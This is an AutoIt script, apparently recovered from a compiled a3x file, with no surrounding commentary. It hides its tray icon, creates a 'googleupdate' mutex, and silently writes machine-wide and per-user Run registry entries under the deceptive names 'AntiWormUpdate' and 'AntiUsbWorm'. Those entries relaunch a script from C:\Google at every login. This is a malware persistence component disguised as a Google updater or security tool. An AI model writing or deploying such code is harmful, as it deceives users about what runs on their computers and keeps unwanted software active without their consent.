#NoTrayIcon
#Region
#AutoIt3Wrapper_Outfile_type=a3x
#EndRegion

Global Const $tagSECURITY_ATTRIBUTES = "dword Length;ptr Descriptor;bool InheritHandle"

If _Singleton("googleupdate", 1) = 0 Then Exit
SetStartup()
While 1
    Sleep(100)
WEnd

Func _Singleton($SOccurenceName, $Iflag = 0)
    Local Const $ERROR_ALREADY_EXISTS = 183
    Local Const $SECURITY_DESCRIPTOR_REVISION = 1
    Local $TSecurityAttributes = 0
    If BitAND($Iflag, 2) Then
        Local $TSecurityDescriptor = DllStructCreate("byte;byte;word;ptr[4]")
        Local $ARET = DllCall("advapi32.dll", "bool", "InitializeSecurityDescriptor", "struct*", $TSecurityDescriptor, "dword", $SECURITY_DESCRIPTOR_REVISION)
        If @error Then Return SetError(@error, @extended, 0)
        If $ARET[0] Then
            $ARET = DllCall("advapi32.dll", "bool", "SetSecurityDescriptorDacl", "struct*", $TSecurityDescriptor, "bool", 1, "ptr", 0, "bool", 0)
            If @error Then Return SetError(@error, @extended, 0)
            If $ARET[0] Then
                $TSecurityAttributes = DllStructCreate($tagSECURITY_ATTRIBUTES)
                DllStructSetData($TSecurityAttributes, 1, DllStructGetSize($TSecurityAttributes))
                DllStructSetData($TSecurityAttributes, 2, DllStructGetPtr($TSecurityDescriptor))
                DllStructSetData($TSecurityAttributes, 3, 0)
            EndIf
        EndIf
    EndIf
    Local $Handle = DllCall("kernel32.dll", "handle", "CreateMutexW", "struct*", $TSecurityAttributes, "bool", 1, "wstr", $SOccurenceName)
    If @error Then Return SetError(@error, @extended, 0)
    Local $LastError = DllCall("kernel32.dll", "dword", "GetLastError")
    If @error Then Return SetError(@error, @extended, 0)
    If $LastError[0]= $ERROR_ALREADY_EXISTS Then
        If BitAND($Iflag, 1) Then
            Return SetError($LastError[0], $LastError[0], 0)
        Else
            Exit - 1
        EndIf
    EndIf
    Return $Handle[0]
EndFunc

Func SetStartup()
    $ScriptDir = "C:\Google"
    $a3xN = "googleupdate.a3x"
    $NewH = $ScriptDir & "\AutoIt3.exe /AutoIt3ExecuteScript "& $ScriptDir & "\"& $a3xN
    $NewHH = @ComSpec & " /c start "& $ScriptDir & "\AutoIt3.exe /AutoIt3ExecuteScript "& $ScriptDir & "\"& $a3xN & "  & exit"
    If RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "AntiWormUpdate") <> $NewH Then RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "AntiWormUpdate", "REG_SZ", $NewH)
    If RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "AntiUsbWorm") <> $NewHH Then RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "AntiUsbWorm", "REG_SZ", $NewHH)
    If RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "AntiWormUpdate") <> $NewH Then RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "AntiWormUpdate", "REG_SZ", $NewH)
    If RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "AntiUsbWorm") <> $NewHH Then RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "AntiUsbWorm", "REG_SZ", $NewHH)
EndFunc